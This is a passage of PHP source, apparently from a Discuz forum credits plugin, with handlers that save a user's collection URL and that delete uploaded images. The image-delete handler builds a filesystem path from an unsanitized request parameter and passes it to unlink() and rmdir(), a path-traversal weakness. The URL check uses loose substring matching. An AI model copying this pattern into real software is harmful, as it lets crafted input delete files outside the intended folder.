				$tmparr=explode("@",$sk_urls);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode($tmparr[$i],$_GET['it618_url']);
					if(count($tmparr1)>1)$flag=1;
				}
			}
			
			if($flag==0){
				echo $it618_credits_lang['t250'].$sk_urls;exit;
			}
		}
		
		
		$it618_credits_uset=C::t('#it618_credits#it618_credits_uset')->fetch_by_uid($uid);
		C::t('#it618_credits#it618_credits_uset')->update($it618_credits_uset["id"],array(
			'it618_skurl' => $_GET['it618_url']
		));
		if($_GET['it618_name']!=''){
			C::t('#it618_credits#it618_credits_uset')->update($it618_credits_uset["id"],array(
				'it618_skname' => it618_credits_utftogbk($_GET['it618_name'])
			));
		}
		
		echo 'okit618_split'.$it618_credits_lang['t252'];
	}
	exit;
}


if($_GET['ac']=="imgdelete"){
	if($uid<=0){
		echo '0';
	}else{
		$shopid=intval($_GET['shopid']);

		if($shopid==0){
			if($it618_credits['credits_wapsalepower']!=$_G['uid']){
				echo '0';exit;
			}
		}
		
		if($shopid==0){
			$tmparr=explode('source/plugin/it618_credits/kindeditor/attached/image/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/attached/image/'.$tmparr[1];
			}
		}
		
		if (file_exists($delpath)) {
			$result=unlink($delpath);
			if(it618_credits_dirsize(dirname($delpath))==0){
				rmdir(dirname($delpath));
			}
			
			echo '1';
		}else{
			echo '0';
		}
	}
	exit;
}

?>